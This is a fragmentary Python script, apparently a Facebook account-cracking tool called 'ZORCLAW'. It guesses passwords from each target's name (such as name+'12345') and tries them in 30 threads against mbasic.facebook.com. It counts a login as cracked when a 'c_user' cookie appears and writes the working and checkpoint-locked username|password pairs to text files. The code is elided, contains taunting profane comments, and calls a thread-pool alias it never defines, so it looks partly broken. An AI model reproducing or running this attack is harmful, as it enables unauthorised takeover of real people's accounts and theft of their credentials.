...
from concurrent.futures import ThreadPoolExecutor as meithunZORCLAW
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back ZORCLAW Menu ")
	    meithun()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[ZORCLAW] {loop} | {len(self.id)} [ok] < > [{len(ok)}] < > [cp] < > [{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ZORCLAW-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ZORCLAW_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [ZORCLAW-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ZORCLAW_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with meithunNISAD(max_workers=30) as ZORCLAWworld:
                for zsb in self.id: # Yo WHY U HERE BITCH !!!
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ZORCLAWworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('Y', 'y'):
            ...
            print(47*"-")
            with meithunNISAD(max_workers=30) as ZORCLAWworld:
                for zsb in self.id: # Yo WHY THE FUCK IS U HERE !!!
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
